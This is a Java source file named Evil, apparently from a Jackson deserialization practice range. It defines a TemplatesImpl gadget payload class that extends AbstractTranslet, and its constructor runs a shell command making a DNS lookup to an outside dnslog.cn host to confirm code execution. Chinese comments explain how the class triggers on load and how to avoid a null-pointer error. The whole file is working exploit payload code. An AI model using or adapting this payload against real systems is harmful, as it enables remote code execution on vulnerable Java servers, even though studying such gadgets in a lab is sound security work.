package com.endlessshw.jacksonrange.util;

import com.sun.org.apache.xalan.internal.xsltc.DOM;
import com.sun.org.apache.xalan.internal.xsltc.TransletException;
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
import com.sun.org.apache.xml.internal.serializer.SerializationHandler;

import java.io.IOException;

/**
 * @author hasee
 * @version 1.0
 * @description:
 * 继承 AbstractTranslet 是为了 TemplatesImpl._transletIndex，即下标位精准定位
 * 修改 namesArray 的目的就是为了防止 {@link TemplatesImpl#getTransletInstance()} 中的 `translet.postInitialization();` 抛出空指针错误
 * @date 2024/9/27 16:37
 */
public class Evil extends AbstractTranslet{
    public Evil() throws IOException {
        super();
        Runtime.getRuntime().exec("dnslookup x5f0yx.dnslog.cn");
        namesArray = new String[2];
        namesArray[0] = "newTransformer";
        namesArray[1] = "123";
    }

    @Override
    public void transform(DOM document, SerializationHandler[] handlers) throws TransletException {

    }

    @Override
    public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException {

    }

    @Override
    public String toString() {
        return "Evil";
    }
}
